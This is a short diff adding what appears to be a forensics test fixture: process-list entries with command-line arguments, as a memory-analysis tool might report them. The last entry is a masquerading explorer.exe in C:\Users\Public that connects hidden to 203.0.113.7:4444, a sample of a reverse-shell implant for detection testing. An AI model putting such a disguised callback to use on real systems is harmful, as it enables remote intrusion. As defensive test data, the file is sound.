@@ -1,0 +1,4 @@
+{"PID": 4, "Process": "System", "Args": "Required memory at 0x10 is not valid (process exited?)"}
+{"PID": 300, "Process": "smss.exe", "Args": "\\SystemRoot\\System32\\smss.exe"}
+{"PID": 600, "Process": "services.exe", "Args": "C:\\Windows\\system32\\services.exe"}
+{"PID": 2000, "Process": "explorer.exe", "Args": "C:\\Users\\Public\\explorer.exe -hidden -connect 203.0.113.7:4444"}
